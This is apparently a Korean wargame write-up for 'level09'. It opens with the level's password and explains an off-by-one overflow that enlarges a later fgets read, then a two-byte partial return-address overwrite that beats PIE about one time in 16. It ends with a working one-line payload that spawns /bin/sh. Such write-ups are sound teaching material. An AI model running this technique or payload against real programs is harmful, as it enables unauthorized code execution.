> Password: fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S

반복문 경계 검사에서 실수 때문에 1바이트까지 잘못된 위치에 쓸 수 있고, 
하필 그 위치가 다음 fgets의 길이를 결정하는 부분이여서, 이 부분을 통해 ret위치를 덮어쓸 수 있음.

pie 가 걸려있어서 넣을 값이 조금 까다롭지만, 같은 section끼리는 msb의 n비트가 같다는 점을 이용해서 lsb에서 최소한의 다른 비트만 쓰면 최소한의 시행착오를 거쳐서 인젝션을 성공할 수 있음.
이번 프로그램에서는 text section의 크기가 최대 1.5바이트이므로 가능한 최소 덮어쓰기 크기인 2바이트를 덮어씌우는데, 이때 최상위 0.5 비트는 랜덤 값을 넣는다. 0.5비트는 16이므로 1 / 16 정도의 충분히 합리적인 확률로 공격에 성공할 수 있다.

cat <(python -c 'import sys; sys.stdout.write("A" * 40 + "\xca" + "A" * 86 + "A" * 0xc8 + "\x8c\x48" + "A" * 821 + "/bin/sh\x00" + "A" * 119)') - | ./level09

NOTE: pie가 활성화되어있기 때문에 payload 중간의 \x48 에서 4 부분은 랜덤으로 바뀔 수도 있음.